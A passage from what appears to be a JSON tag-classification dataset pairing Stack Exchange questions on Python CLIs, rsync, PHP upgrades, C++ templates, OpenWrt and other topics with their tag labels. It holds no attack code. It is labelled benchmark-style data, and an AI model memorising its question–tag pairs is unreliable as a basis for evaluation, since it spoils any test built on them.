logging.Formatter(%(asctime)s %(levelname)s %(name)s %(message)s)handler = logging.StreamHandler(sys.stdout)handler.setLevel(log_level)handler.setFormatter(formatter)logger.addHandler(handler)# Only one parameter is needed for functionality, but I would like# to add support for flags to simulate the python interpreter flags.sys.argv = sys.argv[1:]if not sys.argv:    sys.exit(-1)_file = sys.argv[0]if not _file.endswith('.py'):    # append .py to _file if not present    _file = '{}.py'.format(_file)ran = Falseconfig = get_config(magic.conf)dirs = config.get(magic, path).split()logger.debug('Executing command {}'.format(' '.join(sys.argv)))for _dir in dirs:    filename = os.path.join(_dir, _file)    if not os.path.exists(filename) or not os.path.isfile(filename):        continue    try:        execfile(filename)        ran = True    except Exception, e:        msg = Failed to execute {}. Reason: {}.format(' '.join(sys.argv), e)        if hasattr(e, 'read'):            msg = '{}\\n\\t{}'.format(msg, e.read())        logger.error(msg)        # Here it ran, but raised an exception        raise    breakif not ran:    logger.debug(        Failed to execute file: {0}.         {0} does not exist or is not a file.format(_file))Now, for the dynamic creation of the command line interface. I use inspect to get at the function signature and argparse to implement the CLI.cli.pyimport sysimport inspectimport argparseclass Cli(object):    def __init__(self, description=):        self.parser = argparse.ArgumentParser(description=description,            formatter_class=argparse.RawDescriptionHelpFormatter)        self.subparsers = self.parser.add_subparsers()        self.functions = {}    def command(self):        def inner(fn):            collects information about decorated function, builds a            subparser then returns the function unchanged            name = fn.__name__            self.functions[name] = fn            desc = fn.__doc__            args, _, __, defaults = inspect.getargspec(fn)            if not args:                args = []                defaults = []            if len(args) != len(defaults):                print All cli.command function arguments must have a default.                sys.exit(-1)            _parser = self.subparsers.add_parser(name, description=desc,                formatter_class=argparse.RawDescriptionHelpFormatter)            _parser.set_defaults(func=self.functions[name])            for arg, default in zip(args, defaults):                # Try the lower case first letter for the short option first                if '-{}'.format(arg[0]) not in _parser._option_string_actions:                    flag = ('-{}'.format(arg[0]), '--{}'.format(arg))                # Then the upper-case first letter for the short option                elif '-{}'.format(arg[0]).upper() not in _parser._option_string_actions:                    flag = ('-{}'.format(arg[0]).upper(), '--{}'.format(arg))                # otherwise no short option                else:                    flag = ('--{}'.format(arg))                if isinstance(default, basestring):                    _parser.add_argument(*flag, type=str, default=default)                elif isinstance(default, list):                    _parser.add_argument(*flag, nargs='+')                elif isinstance(default, bool):                    if default:                        _parser.add_argument(                            *flag, action='store_false', default=default)                    else:                        _parser.add_argument(                            *flag, action='store_true', default=default)                elif isinstance(default, int):                    _parser.add_argument(*flag, type=int, default=default)            return fn        return inner    def run(self):        Executes the function corresponding to the command line        arguments provided by the user        args = self.parser.parse_args()        func = args.func        _args, _, __, defaults = inspect.getargspec(func)        kwargs = {}        for arg in _args:            kwargs[arg] = getattr(args, arg)        func(**kwargs)Now for the web GUI. Here is the script web.py which dynamically loads anything in our plugin directory as a plugin:import osimport var.lib.bottle as bottledef _get_plugins(app):    This function builds a list    ret = {}    dirs = [d for d in os.walk(app.PLUGIN_DIR).next()[1]]    dirs.sort()    for d in dirs:        # import the main function into a temporary variable        _main = __import__(            'var.www.plugins.{}.plugin'.format(d),            globals(),            locals(),            ['main'])        # add plugin directory to TEMPLATE_DIR so they can house their        # own templates (this allows plugins to be self-contained)        bottle.TEMPLATE_PATH.append(os.path.join(app.PLUGIN_DIR, d))        # Route GET and POST requests to the main() method of plugin.py        app.route(            '/{}'.format(d),            ['GET', 'POST', 'DELETE', 'PUT', 'PATCH'],            _main.main)        ret[d] = bottle.template('link', name=d)        # TODO: inspect function to allow for dynamic routing and        #       service discovery    return retapp = bottle.Bottle()bottle.TEMPLATE_PATH = ['var/www/templates/']app.PLUGIN_DIR = 'var/www/plugins/'app.STATIC_DIR = 'var/www/static/'@app.route('/')@app.route('/index')@app.route('/index.html')@bottle.view('index')def index():    Returns the index template with a list of templates(actually a    list of links to the plugins URIs).    return {'plugins': app.PLUGINS}@app.route('/static/<filepath:path>')def static(filepath):    Serves static files located in app.STATIC_DIR.    return bottle.static_file(filepath, root=app.STATIC_DIR)if __name__ == '__main__':    app.PLUGINS = _get_plugins(app)    app.run(server='cherrypy')Is it a good idea to structure apps this way to provide a cross-platform application with as little boiler-plate code as possible?",
    "target": "python;console;user interface;bottle;cherrypy"
  },
  {
    "id": "_codereview.71114",
    "source": "Finding average word length in a given year <eos> I have written a function which takes the year in question and words as a data which is a dictionary that maps words to the list of year/count. Now I am wondering how I can improve the code that I have or how to make it more simpler or make it better performance-wise.def avgWordLen(year, words):    totLen = 0    totword = 0    for word in words:        for nary in words[word]:            if nary.year == year:                totLen += len(word) * nary.count                totword += nary.count    if totword != 0:        return totLen / totword    else:        return 0",
    "target": "python;performance;python 3.x;hash table"
  },
  {
    "id": "_unix.120679",
    "source": "Configuring anonymous rsync daemon <eos> EDIT: I have since found that by using a folder in the root directory, things get a bit further - I can list the subfiles.  So it really looks like permissions on the folder are the issue.  I'm not sure what else to do besides chmod 777.I'm trying to configure an anonymous rsync daemon on CentOS 5.9.If I allow chroot the server reports that chroot fails.  If I disable it, chdir fails.# rsyncd.confmax connections = 20log file = /var/log/rsync.logtimeout = 300use chroot = false[builds]    path = /home/fuzz/builds    read only = yes    list = yes    uid = nobody    gid = nobody.# /etc/xinetd.d/rsync# default: off# description: The rsync server is a good addition to an ftp server, as it \\#       allows crc checksumming etc.service rsync{        disable = no        socket_type     = stream        wait            = no        user            = root        server          = /usr/bin/rsync        server_args     = --daemon        log_on_failure  += USERID}I have set all files and folders under /home/fuzz/builds to 777.  The folder is owned by the user fuzz.On the client side, this works...$ rsync rsync://hostbuildsBut when I try to view the contents of the builds directory, I get this error...$ rsync -vvvv rsync://host/buildsopening tcp connection to host port 873Connected to host (10.186.5.90)note: iconv_open(UTF-8, UTF-8) succeeded.sending daemon args: --server --sender -vvvvde.Lsf . builds/@ERROR: chdir failed[Receiver] _exit_cleanup(code=5, file=main.c, line=1534): enteredrsync error: error starting client-server protocol (code 5) at main.c(1534) [Receiver=3.0.9][Receiver] _exit_cleanup(code=5, file=main.c, line=1534): about to call exit(5)",
    "target": "rsync;daemon"
  },
  {
    "id": "_codereview.164045",
    "source": "Select value based on condition on dataframe <eos> I have some data in data frame and would like to return a value based on specific conditions.  It is highly time consuming.I tried three methods:Method 1:Without dataframe, this is the simple logic I have and it is super fast.@numba.vectorize(['float64(float64, float64)'])def Method1(a,b):    x=0.0    y=0.0    z=0.0    if (a <= 0.002):        x=0.5        y=2500        z=20000    elif (a <= 0.003):        x=0.3        y=2500        z=15000    elif (a <= 0.005):        x=0.2        y=1000        z=10000    else:        return 0.0    return min(max(x*b,y),z)%timeit Method1(0.001,200000)Method 2 - Input the condition data as a dataframe and run the functiondict = {'amin':[0.000,0.002,0.003],       'amax':[0.002,0.003,0.005],       'dfx':[0.5,0.3,0.2],       'dfy':[2500,2500,1000],       'dfz':[20000,15000,10000]}df=pd.DataFrame(dict)@numba.vectorize(['float64(float64, float64)'])def Method2(a,b):    x=0.0    y=0.0    z=0.0    x=df[(a<=df.amax) & (a>=df.amin)]['dfx'].values    y=df[(a<=df.amax) & (a>=df.amin)]['dfz'].values    z=df[(a<=df.amax) & (a>=df.amin)]['dfy'].values    if (len(x)==0) or (len(y)==0) or (len(z)==0):        return 0.0    else:        return min(max(x[0]*b,y[0]),z[0])%timeit Method2(0.001,200000)Method 3 - looped the rows of the dfdef Method3(a,b):    for index,row in df.iterrows():        if (mPD >= row['amin']) & (mPD <= row['amax']):            return min(max(row['dfx']*b,row['dfy']),row['dfz'])    return 0.0%timeit Method3(0.001,200000)Method 1 gets finished in 1.2 micro secondsMethod 2 takes 2.47 milli seconds (1000 times slower than the Method 1)Method 3 takes ~80 micro secondsPlease help me how to improve the performance of Method 2 / 3.Also, please let me know why Method 3 is faster?P.S. I plan to use Numba so cannot use lambda in the functions.",
    "target": "python;performance;python 2.7;lambda;numba"
  },
  {
    "id": "_unix.90819",
    "source": "PHP Upgrade Error (PHP 5.3.3 to PHP 5.4.19 on CentOS 6.4) <eos> I'm using CentOS 6.4 and I was following this tutorial in order to upgrade PHP from v 5.3.3 to v 5.4.19 but I got the following error:Error: php54w-common conflicts with php-common-5.3.3-23.el6_4.i686. How do I resolve this problem?[my_profile@localhost gplus-quickstart-php]$ sudo rpm -Uvh http://mirror.webtatic.com/yum/el6/latest.rpm                                                           [sudo] password for my_profile:                                                    Retrieving http://mirror.webtatic.com/yum/el6/latest.rpm                        warning: /var/tmp/rpm-tmp.S0yqSL: Header V4 DSA/SHA1 Signature, key ID cf4c4ff9: NOKEY                                                                          Preparing...                ########################################### [100%]     1:webtatic-release       ########################################### [100%]  [my_profile@localhost gplus-quickstart-php]$ sudo yum install php54wLoaded plugins: fastestmirror, refresh-packagekit, security      Loading mirror speeds from cached hostfile                        * base: mirror.netglobalis.net                                   * extras: mirror.netglobalis.net                                 * rpmforge: mirror.nexcess.net                                   * updates: mirror.netglobalis.net                                * webtatic: us-east.repo.webtatic.com                           webtatic                                                 | 2.9 kB     00:00     webtatic/primary_db                                      |  98 kB     00:00Setting up Install ProcessResolving Dependencies--> Running transaction check---> Package php54w.i386 0:5.4.19-1.w6 will be installed--> Processing Dependency: php54w-common = 5.4.19-1.w6 for package: php54w-5.4.19-1.w6.i386--> Processing Dependency: php54w-cli = 5.4.19-1.w6 for package: php54w-5.4.19-1.w6.i386--> Running transaction check---> Package php54w-cli.i386 0:5.4.19-1.w6 will be installed---> Package php54w-common.i386 0:5.4.19-1.w6 will be installed--> Processing Conflict: php54w-common-5.4.19-1.w6.i386 conflicts php-common < 5.4.0--> Finished Dependency ResolutionError: php54w-common conflicts with php-common-5.3.3-23.el6_4.i686 You could try using --skip-broken to work around the problem You could try running: rpm -Va --nofiles --nodigest[my_profile@localhost gplus-quickstart-php]$ ^C[my_profile@localhost gplus-quickstart-php]$ ^C[my_profile@localhost gplus-quickstart-php]$ Error: php54w-common conflicts with php-common-5.3.3-23.el6_4.i686bash: Error:: command not found[my_profile@localhost gplus-quickstart-php]$",
    "target": "centos;php;upgrade"
  },
  {
    "id": "_unix.25822",
    "source": "Debian + Nginx/Unicorn permissions <eos> Is there a security risk in running a web server like Unicorn as root?The Nginx master process runs as root, the Nginx worker runs as the limited www-data user, but I can't set another user like www-data to run the Unicorn master/workers without messing around with www-data's PATH.",
    "target": "security;nginx"
  },
  {
    "id": "_unix.339832",
    "source": "How to assign LDAP user to local group users? <eos> We have machines with both local and LDAP accounts. Every computer has a HDD mounted where the local group users has reading and writing permissions. How can I add all the LDAP users to that group users?",
    "target": "linux;ubuntu;ldap"
  },
  {
    "id": "_codereview.116075",
    "source": "C++ Template for one to many Registration (pre Gang of Four) <eos> I use this template to lookup clients registered for data. The data is associated by name(key) and clients are shared pointers (value) to a class which will consume the data.//////////////////////////////////////////////////////////////////////// Registrar Template to help manage Key to Value Registrations////   T1 - Key Object//   T2 - Value Object////  For Example: Register clients (T2) for Data (T1) ////////////////////////////////////////////////////////////////////#ifndef _RegistrarT_hpp_#define _RegistrarT_hpp_#include <map>#include <vector>#include <set>template <class T1,class T2, class CompareT1 = std::less<T1> >class RegistrarT{public:  typedef std::multimap<T1,T2, CompareT1> RegistrationMultiMap;  typedef std::vector<T2>                 RegistrationVector;  typedef std::set<T1>                    KeySet;public:  RegistrarT(){}  ~RegistrarT(){}  //   // Register a value; Do not allow duplicate registrations  void Register(T1 const & key, T2 const & value)  {    Unregister(key, value); // Remove if it exists in the multimap    registrations_.insert(std::make_pair(key,value));  }  // Lookup all Registered for Key then find and remove value  void Unregister(T1 const & key, T2 const & value)  {    bool found=false;    typename RegistrationMultiMap::iterator itr =                 registrations_.lower_bound(key);    while (!found && itr != registrations_.upper_bound(key))    {      if (itr->second == value)        found = true;      else        ++itr;    }    if (found)      registrations_.erase(itr);  }  // Remove all values registered for key  void UnregisterByKey(T1 const & key)  {    registrations_.erase(registrations_.lower_bound(key),                         registrations_.upper_bound(key));  } // Find all values and remove registrations for all keys  void UnregisterAll(T2 const & value)  {    typename RegistrationMultiMap::iterator itr =         registrations_.begin();    while (itr != registrations_.end())    {      if (itr->second == value)        registrations_.erase(itr++);      else        ++itr;    }  }  // Find all values and remove registrations for all keys  // return all keys affected  void UnregisterAll(T2 const & value, KeySet& ks)  {    typename RegistrationMultiMap::iterator itr =         registrations_.begin();    while (itr != registrations_.end())    {      if (itr->second == value)      {        ks.insert(itr->first);        registrations_.erase(itr++);      }      else       ++itr;    }  }  // Get all values registered for key  bool GetRegistrations(T1 const & key, RegistrationVector& rv)  {    typename RegistrationMultiMap::iterator itr =         registrations_.lower_bound(key);    while (itr != registrations_.upper_bound(key))    {      rv.push_back(itr->second);      ++itr;    }    return (rv.size() > 0);  }  // Get all keys; std::set will not allow duplicates  void GetRegistrationKeys(KeySet& ks)  {    typename RegistrationMultiMap::iterator itr =         registrations_.begin();    while (itr != registrations_.end())    {      ks.insert(itr->first);      ++itr;    }  }  // Check if key is registered  bool RegistrationsExist(T1 const & key)  {    typename RegistrationMultiMap::iterator itr =         registrations_.lower_bound(key);    return (itr != registrations_.upper_bound(key));  }  // Get count of registrations for key  std::size_t RegistrationsCount(T1 const & key)  {    std::size_t cnt=0;    typename RegistrationMultiMap::iterator itr =         registrations_.lower_bound(key);    while (itr != registrations_.upper_bound(key))    {      cnt++;      ++itr;    }    return (cnt);  }  // Is value registered for key?  bool RegistrationsExist(T1 const & key, T2 const & value)  {    typedef typename RegistrationMultiMap::iterator ResIter;    std::pair< ResIter , ResIter>  range=         registrations_.equal_range(key);    ResIter it;    for(it=range.first;it!=range.second;++it)    {      if(it->second==value) return true;    }    return false;  }  // Is any value registered  bool RegistrationsExist()  {    return ! registrations_.empty();  }  // How many keys are in use  std::size_t RegistrationCount()  {    return registrations_.size();  }  // Clean up  void Clear()  {    registrations_.clear();  }private:  RegistrationMultiMap  registrations_; // Holds all};#endif // _RegistrarT_hpp_Sample usage:#include RegistrarT.hpp#include <string>typedef RegistrarT<std::string,std::string> NewsRegistrations;int main(int argc, char *argv[]){  NewsRegistrations sportingNews_;  NewsRegistrations::KeySet keyset;  std::string moe(Moe);  std::string curly(Curly);  std::string larry(Larry);   sportingNews_.Register(std::string(Football),moe);   sportingNews_.Register(std::string(Wrestling),moe);   sportingNews_.Register(std::string(Wrestling),curly);   sportingNews_.RegistrationsCount(std::string(Wrestling));   sportingNews_.Register(std::string(Rugby),curly);   sportingNews_.Register(std::string(BeachVolleyBall),larry);   sportingNews_.UnregisterAll(moe,keyset);   sportingNews_.UnregisterByKey(std::string(Wrestling));   sportingNews_.RegistrationsExist(std::string(Bowling));}I use a test framework so for simplicity I did not post my tests. Basically I check Registration counts and if Registrations exist. Looking to learn new stuff and gain reputation points so I can attempt to give back.",
    "target": "c++;design patterns;template"
  },
  {
    "id": "_codereview.26449",
    "source": "Is my solitaire cipher too imperative for an Object Oriented language like Ruby? <eos> I am teaching myself Ruby and Ruby-on-rails, as part of this regimen I thought it would be a good idea to do some Ruby quiz exercises and so I started with the solitaire cipher.  The basic functionality of decoding a properly formatted message is there but only just so.  I've come to the realization that I've written this like Ruby has no object-oriented functionality, and instead it's a big imperative function full of clever expressions that make it hard to read.At this point I would like to pad it out with a fuller feature set and unclever some of the logic, and I wanted to do so via TDD.  Is this program hardly unit-testable because of it's imperative design?As someone who wants to be a great ruby programmer, is it imperative that I refactor this code to utilize classes, methods and objects?  If not, will unit-testing be of very limited value as a result?  Am I overreacting and this is fine for what it was designed?input = String.newinput = ARGV[0].dupdef solitaire(input)def decode(msg)    #Creates a hash with keys 1-54    abc = ('A'..'Z').to_a    alphaHash = Hash.new    alphaHash.default =       (1..54).to_a.each {|x| alphaHash[x] = (abc[x - 1])}  #assigns 1-26 a letter in alphabetical order    abc.each {|x| alphaHash[abc.index(x) + 27] = x}  #assigns letters in order to 27-52                                                                                                     #All non-joker card values 1-52 can be resolved to their letter    #Creates array in which each letter from msg is added as a number to the array, A = 1, B = 2 etc.    msg.delete! ' '    convertedMessage = Array.new    msg.each_char {|letter| convertedMessage << alphaHash.key(letter)}    #Create deck array, for this example in ascending numerical order; clubs, diamonds, hearts, spades    deck = (1..54).to_a    #Set indexes of two jokers    jkr_a_idx = deck.index 53    jkr_b_idx = deck.index 54    convertedKeys = Array.new    #This uses the solitaire cipher to generate the keys the message was encrypted with    while convertedKeys.length < convertedMessage.length        #Joker A down one card        jkr_a_idx = deck.index 53        jkr_a_idx += 1        #check if it returns to front of deck        if jkr_a_idx >= 54            jkr_a_idx -= 54   #Reset index to beginning of deck            jkr_a_idx += 1     #Joker can never be first card so it skips index 0        end        #Remove and insert Joker A at new index        deck.delete(53)        deck.insert(jkr_a_idx, 53)        #Joker B down two cards        jkr_b_idx = deck.index 54        jkr_b_idx += 2        #check if Joker B must return to front of deck        if jkr_b_idx >= 54            jkr_b_idx -= 54       #Reset index to beginning of deck            jkr_b_idx += 1        #Joker can never be first card so it skips index 0.        end        #Remove and insert Joker B at new index        deck.delete(54)        deck.insert(jkr_b_idx, 54)        #Triple cut around jokers, exchange cards above first joker with cards below second joker.        #determine top and bottom jokers        topJoker = deck.detect {|e| e == 53 or e == 54}        if topJoker == 53            bottomJoker = 54        end        if topJoker == 54            bottomJoker = 53        end        #Make the cuts        topCut = deck.slice!(0...deck.index(topJoker))        if bottomJoker != deck.last         #if a joker is the last card, there is no bottom cut            bottomCut = deck.slice!((deck.index(bottomJoker) + 1)..-1) #cuts cards after bottom joker to the last one            deck.unshift bottomCut          #Inserts the bottomCut at the front            deck.flatten!        end        deck << topCut        deck.flatten!  #deck must be flattened as cuts are inserted as nested arrays        #Count cut:  take last card's value, cut this many cards from top and insert before last card        if deck.last == 53 or deck.last == 54           #Either joker's value is always 53            countCut = deck.slice!(0...53)          #If either joker is the last card, we cut 53 cards        else             countCut = deck.slice!(0...deck.last)        end        deck.insert(deck.index(deck.last), countCut)  #inserts the countCut before the last card        deck.flatten!        #Take first card's value, count this many cards, convert the facing card to a letter, this is the letter for the keystream        if deck.first == 54         #All jokers get value 53            if deck[53] != 53 and deck[53] != 54            #If a joker is the facing card, there is no output to the keystream for this iteration                convertedKeys << alphaHash.key((alphaHash[deck[53]])) #Any other facing card is converted to a letter, then back to numeric            end        else            if deck[deck.first] != 53 and deck[deck.first] != 54  #Step is skipped if the facing card is a joker                convertedKeys << alphaHash.key((alphaHash[deck[deck.first]]))            end        end     end #while loop    decodedMessage = String.new     #Decodes the message    #Both convertedMessage and convertedKeys are numeric values 1-26    convertedMessage.each { |value|                 #When decoding, subtract key from the encoded value for the decoded message            if convertedKeys[decodedMessage.length] >= value  #If this operation is 0 or negative, add 26 to value                decodedMessage << alphaHash[((value + 26) - convertedKeys[decodedMessage.length])]            else                decodedMessage << alphaHash[(value - convertedKeys[decodedMessage.length])]            end                             }       decodedMessageend  #decodeputs decode(input)endputs solitaire(input)",
    "target": "ruby"
  },
  {
    "id": "_unix.214392",
    "source": "Huge packet loss on openwrt <eos> I have a strange issue on mikrotik rb951-2hnd router. I built image a few years ago using revision 39392 and patch firmwared it and everything worked fine. Just a few months ago I decided to update firmware. So I did it and discovered that physical network is completely broken. I have over 90% packet loss via ethernet ports, though wifi works perfect . I thought that I messed up while build. So I firmwared 2 different images from download.openwrt and a couple  more that I built by myself, but symptoms are always the same. I wanted to try worked for me svn revision but unfortunately this patch is unavailable so I can't firmare image back. The funny thing that everything including physical ports works while netbooting via vmlinux-initramfs (bootp) the same build revision.  Since vmlinux works fine I suspect that flash is damaged so I made myself sure that files from rootfs.tar.gz and firmwared ones are the same.  On the next step I compared the loaded demons on vmlinux-initramfs and firmwared system, the firmwared one has extra listed below:nf_log_common.konf_log_ipv4.konf_log_ipv6.konf_nat_masquerade_ipv4.konf_reject_ipv4nf_reject_ipv4.konf_reject_ipv6nf_reject_ipv6.konls_base.koPreventing them from loading doesn't help. Furthermore I get no  errors from dmesg or logread. Here's my configuration:topiptables -L -n/etc/config/network - 1 wan. 2-5 lan (wifi in sta client mode)scenario for dhcp:After plugging laptop (dhcp client) to lan port for 15 seconds ( plug out after) I see the followings:Laptop send:  3 dhcp request and 9 icmpv6  Laptop receive: 0  packetsrouter sends: None ? (ifconfig displays 4 packets but tcpdump doesn't catch them)  router receives: 2 icmp packets fromLaptop sent list (listed below)I also checked tcpdump on router, and it doesn't show lost packets. Seems like the problem is somewhere on the driver level. But wait, vmlinux works and drivers (kernel modules) are the same.root@OpenWrt:/# tcpdump -vv -i eth0.3tcpdump: WARNING: eth0.3: no IPv4 address assignedtcpdump: listening on eth0.3, link-type EN10MB (Ethernet), capture size 65535 bytes[ 1042.060000] Atheros AR8216/AR8236/AR8316 ag71xx-mdio.0:00: Port 2 is up09:35:24.172637 IP6 (hlim 1, next-header Options (0) payload length: 36) :: > ff02::16: HBH (rtalert: 0x0000) (padn) [icmp6 sum ok] ICMP6, m]09:35:25.872843 IP6 (hlim 255, next-header ICMPv6 (58) payload length: 16) fe80::b2e3:928a:66b2:ff43 > ff02::2: [icmp6 sum ok] ICMP6, router6          source link-address option (1), length 8 (1): 5c:f9:dd:48:9e:89            0x0000:  5cf9 dd48 9e895c:f9:dd:48:9e:89 /fe80::b2e3:928a:66b2:ff43 - laptop,  d4:ca:6d:92:a4:7e / fe80::d6ca:6dff:fe92:a47e: - routerscenario for static ip:openwrt (static 192.168.2.1)root@OpenWrt:/# ping 192.168.2.2PING 192.168.2.2 (192.168.2.2): 56 data bytes64 bytes from 192.168.2.2: seq=4 ttl=64 time=0.505 ms64 bytes from 192.168.2.2: seq=21 ttl=64 time=0.489 ms64 bytes from 192.168.2.2: seq=34 ttl=64 time=0.528 ms64 bytes from 192.168.2.2: seq=39 ttl=64 time=0.512 ms64 bytes from 192.168.2.2: seq=45 ttl=64 time=0.527 ms64 bytes from 192.168.2.2: seq=48 ttl=64 time=0.549 ms64 bytes from 192.168.2.2: seq=51 ttl=64 time=0.813 ms^C--- 192.168.2.2 ping statistics ---56 packets transmitted, 7 packets received, 87% packet lossround-trip min/avg/max = 0.489/0.560/0.813 mslaptop (static 192.168.2.2)14:50:08:andrew:/home/andrew:0: ping 192.168.2.1PING 192.168.2.1 (192.168.2.1) 56(84) bytes of data.From 192.168.2.2 icmp_seq=13 Destination Host UnreachableFrom 192.168.2.2 icmp_seq=14 Destination Host UnreachableFrom 192.168.2.2 icmp_seq=15 Destination Host Unreachable^C--- 192.168.2.1 ping statistics ---100 packets transmitted, 0 received, +3 errors, 100% packet loss, time 99022mspipe 314:51:53:andrew:/home/andrew:1: ping 192.168.2.1PING 192.168.2.1 (192.168.2.1) 56(84) bytes of data.^C--- 192.168.2.1 ping statistics ---29 packets transmitted, 0 received, 100% packet loss, time 28080msSo here is my question:What steps should I take to dive deeper and find out what the problem is? I want to find at least the error. Should I turn a debug level somewhere? What can cause such a huge packet loss?  EDIT Netbooting vmlinux produces the same Netbooting kerneldebug - works perfectly, unfortunately its size is 11mb, mtd1 is to small to hold it.",
    "target": "networking;openwrt;tcpdump"
  },
  {
    "id": "_cs.13181",
    "source": "Time complexity of a backtrack algorithm <eos> I've developed the following backtrack algorithm, and I'm trying to find out it time complexity.A set of $K$ integers defines a set of modular distances between all pairs of them. In thisalgorithm, I considered the inverse problem of reconstructing all integer sets which realize a given distance multiset. i.e. :Inputs: $D=\\{p_ip_j \\mod N, ij \\},K $Output : $P=\\{p_1,p_2,...,p_K\\},\\qquad p_i \\in \\{0,1,2,...,N-1\\},\\qquad p_i > p_j $ for $i>j$Simply saying, the algorithm puts $K$ blanks to be filled. Initially, puts 1 in the first blank. For the second blank it looks for the first integer that if we add to P, it doesn't produce any difference exceeding the existent differences in $D$. Then, it does so, for next blanks. While filling a blank if it checked all possible integers and found no suitable integer for that blank, it turns back to the previous blank and looks for next suitable integer for it. If all blanks are filled, it has finished his job, otherwise it means that there weren't any possible $P$'s for this $D$.Here's my analysis so far.Since the algorithm checks at most all members of $\\{2,...,N\\}$ for each blank (upper bound) there is $N-1$ search for each blank. If each visited blank was filled in visiting time, the complexity would be $O((K-1)(N-1))$ since we have $K-1$ blank (assuming first one is filled with 1). But the algorithm is more complex since for some blanks it goes backward and some blanks may be visited more that once. I'm looking for the worst case complexity i.e. the case that all blanks are visited and no solution is found.",
    "target": "algorithms;algorithm analysis;combinatorics;search algorithms;greedy algorithms"
  },
  {
    "id": "_softwareengineering.133506",
    "source": "When stuck, how quickly should one resort to Stack Overflow? <eos> I'm self-learning iOS development through the iTunes U CS193p course, and I often find myself stuck. I've been trying to get unstuck myself, but it might take me hours and hours to figure out what I'm doing wrong, be it missing a method or not really getting a whole concept like delegation. I'm worried that I might be wasting too much time, and I'd be better off going to Stack Overflow shortly after I get stuck so I can move on. In your experience, does quickly asking on Stack Overflow hamper the learning process or improve it?",
    "target": "productivity;education"
  },
  {
    "id": "_unix.268666",
    "source": "How to use cd command in su command? <eos> In the below script the cases aserver and bserver work fine. But in case cserver above, after su - gsxuserp, I need to perform the following three options with the same user.cd ..cd random_directorytail -f file_in_random_directoryI am not able to do this using -c option, since the connection just closes without executing anything. can someone please suggest a basic way to do this?echo Please type one of the following: aserver,bserver,cserver: read inputecho You entered: $inputcase $input in     aserver)        echo Logging into a. Please enter the passwords when prompted        ssh -t user@something.com ssh -t aserver su - gsxp -c sqlplus grep_ro/pwd        ;;    bserver)        echo Logging into b. Please enter the passwords when prompted        ssh -t user@something.com ssh -t bserver su - gsxp -c sqlplus grep_ro/pwd        ;;    cserver)        echo Logging into c. Please enter the passwords when prompted        ssh -t user@something.com ssh -t cserver su - gsxuserp -c cd         ;;        *)         echo Incorrect Option entered. Exiting the script        ;;esac",
    "target": "shell script;command line;su;cd command"
  },
  {
    "id": "_codereview.16426",
    "source": "Simple array-based Stack class in Java <eos> I have created a simple array-based Stack class with some methods like the actual Stack in Java.I am testing this for mistakes, but since I am learning Java, my tests may not be as comprehensive as they should.import java.util.*;public class SJUStack<E> {    // Data Fields    private E[] theData;    private int topOfStack = -1;    private static final int INITIAL_CAPACITY = 10;    private int size = 0;    private int capacity = 0;    // Constructors    public SJUStack(int initCapacity) {        capacity = initCapacity;        theData = (E[]) new Object[capacity];    }    public SJUStack() {        this(INITIAL_CAPACITY);    }    // Methods    public E push(E e) {        if(size == capacity) {            reallocate();        }        theData[size] = e;        size++;        topOfStack++;        return e;    } // End push(E e) method    public E peek() {        if(empty()) {            throw new EmptyStackException();        }        return theData[topOfStack];    } // End peek() method    public E pop() {        E result = peek();        theData[topOfStack] = null;        size--;        topOfStack--;        if(size <= (capacity/4) && capacity >= INITIAL_CAPACITY) {            shrink();        }        return result;    } // End pop() method    public boolean empty() {        return size == 0;    } // End empty() method    private void reallocate() {        capacity *= 2;        theData = Arrays.copyOf(theData, capacity);    } // End reallocate() method    private void shrink() {        capacity /= 2;        theData = Arrays.copyOf(theData, capacity);    } // End shrink() method    public String toString() {        return Arrays.toString(theData);    } // End toString() method    public int size() {        return size;    } // End size() method}",
    "target": "java;array;homework;stack"
  },
  {
    "id": "_unix.244557",
    "source": "sed -e 's/^[0-9]//' does not work for the first line <eos> The following is the text I want to parse with sed (Mac OS X 10.11.1 bash)100:25:43,959 --> 00:25:46,502Here you are, sir.Main level, please.I can delete the first line with sed -e 's/[0-9]//'.But with sed -e 's/^[0-9]//', the first line, i.e. 1  remains there.Since 1 is at the beginning of the first line, shouldn't it be deleted?head -n1 2001.srt | od -c0000000  357 273 277   1  \\n0000005Just created a new text file starting with 1.head -n1 2002.srt | od -c0000000    1  \\n0000002sed -e 's/^[0-9]//' works for this newly created file.Yes, there's something before 1.",
    "target": "text processing;sed;regular expression"
  },
  {
    "id": "_cs.62464",
    "source": "Counting the number of minimal covers of a binary matrix <eos> Given a binary $n$-times-$n$ matrix $A$, we'd like to cover the regions comprised of $1$'s with non-intersecting rectangles. A collection of disjoint rectangles that covers all $1$'s (and only $1$'s, i.e., it mustn't cover any $0$'s) is called a cover. (Notice that a problem instance may have many different covers.)A cover is called a minimum cover if it uses the smallest number of rectnagles possible.The counting problem I'm interested in is: given an $n$-times-$n$ binary matrix $A$, count the number of minimum covers of $A$.What can you say about this problem? (This post was inspired by this SO question.)",
    "target": "algorithms;complexity theory"
  },
  {
    "id": "_unix.151012",
    "source": "Two way internet sharing configuration (swiching modem from one machine to another) <eos> I have:One Raspberry Pi with Raspbian (distribution based on Debian), with one enthernet interfaceOne laptop with windows, with one ethernet interfaceOne USB modemEthernet cable between Pi and laptopI want to:Share internet on Raspberry Pi when modem is connected to PiUse internet which is shared on laptop when modem is connected to laptop.What I have done:My modem is working on both machines, its ppp0 interface on Pi. ppp0 has dynamic IP.Sharing internet from laptop to Raspberry works. Laptop IP: 192.168.137.1Question:How can I share internet on Raspberry Pi without ruining too much / reconfiguring network on both machines when I switch modem from one machine to another? Extra question: I know that interfaces on both windows and linux can have multiple IP addresses. Can I have both configurations set and just plug my modem here and there and start connection to have internet on second machine?",
    "target": "networking"
  },
  {
    "id": "_webapps.10375",
    "source": "How exactly does sharing work in Google Drive? <eos> I have an Excel spreadsheet I made to track my own scores for an Xbox game I play (TrialsHD, if you are curious). I've made it available to other players so they can track their own scores, but it occurred to me that more people could use it if I figured out how to make it available to people online. I know I can import from Excel to Google Spreadsheets, but I'm not sure if sharing works in the way I need it to.Specifically, I don't want people to share and edit the master, each person needs their own independent copy of the spreadsheet to enter their race scores and times. In essense, my copy is like a template.Can I do Google Drive sharing like this? How exactly would it work? (Would each person need their own independent Google account?)If not, is there another tool out there that would work for me to make this spreadsheet available for other users? What about the newly announced MS Office online products?",
    "target": "google spreadsheets;google drive"
  },
  {
    "id": "_unix.216020",
